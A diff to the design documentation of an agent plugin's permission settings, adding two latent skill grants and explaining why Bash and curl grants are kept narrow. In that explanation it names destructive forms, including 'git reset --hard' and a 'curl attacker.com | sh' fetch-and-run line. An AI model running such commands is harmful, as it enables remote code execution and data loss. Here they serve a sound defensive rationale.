@@ -636,7 +636,9 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
       "mcp__plugin_agent-kevin_kevin__task_thread",
       "mcp__plugin_agent-kevin_kevin__task_update",
       "Skill(agent-kevin:dashboard)",
+      "Skill(agent-kevin:plan-spec)",
       "Skill(agent-kevin:setup-worktree)",
+      "Skill(agent-kevin:simple-simplify)",
       "Skill(agent-kevin:where-am-i)"
     ]
   }
@@ -656,7 +658,7 @@ Concrete approach: `Read` the existing file (treat as `{}` if absent), build the
 | Browser-gated | `perplexity_search`, `playwright_*`, `browser_flows` | configure-skills A.2b (Browser walk) |
 | Database-gated | `db_list`, `db_query`, `db_schema` | configure-skills A.2c (Database walk) |
 
-The allow list also carries three **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)` and `Skill(agent-kevin:where-am-i)` are **active**: both are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar). `Skill(agent-kevin:setup-worktree)` is **latent**: `setup-worktree` currently sets `disable-model-invocation`, so the grant does nothing until that flag is dropped; it's kept here so enabling model invocation needs no settings change.
+The allow list also carries five **skill** grants. Skills register regardless of permissions — the grant only suppresses the confirm prompt on model invocation (whether Kevin auto-fires the skill directly or one skill invokes another via the Skill tool). `Skill(agent-kevin:dashboard)` and `Skill(agent-kevin:where-am-i)` are **active**: both are model-invocable (no `disable-model-invocation`). `dashboard` refreshes-and-opens the Agent OS dashboard on a plain "refresh the dashboard"; `where-am-i` answers "where am I" directly and is also invoked by `dashboard` and `sync` to freshen the session radar (one source of truth for the radar). `Skill(agent-kevin:setup-worktree)`, `Skill(agent-kevin:plan-spec)`, and `Skill(agent-kevin:simple-simplify)` are **latent**: all three currently set `disable-model-invocation` (slash-only — `/plan-spec`, `/simple-simplify`), so the grant does nothing until that flag is dropped; they're kept here so enabling model invocation needs no settings change.
 
 **Why the Bash entries are scoped this narrowly:** broad patterns like `Bash(git *)` or `Bash(curl *)` would also authorize destructive forms (`git push --force`, `git reset --hard`, `curl attacker.com | sh`). The patterns above cover the read-mostly + scaffold-creation commands core skills actually use (`git log/status/diff/config`, `date`, `readlink`, `ls`, `find`, `cat`, `mkdir -p`, `test`, `echo`) — nothing that mutates source-control state or hits the network. **Network/curl is intentionally NOT pre-granted anywhere** — `wordpress-rest` and any other skill that makes outbound HTTP confirms on first call; the user picks "Always allow" to lock the grant to their actual URL pattern (much tighter than blanket `Bash(curl *)`).
 
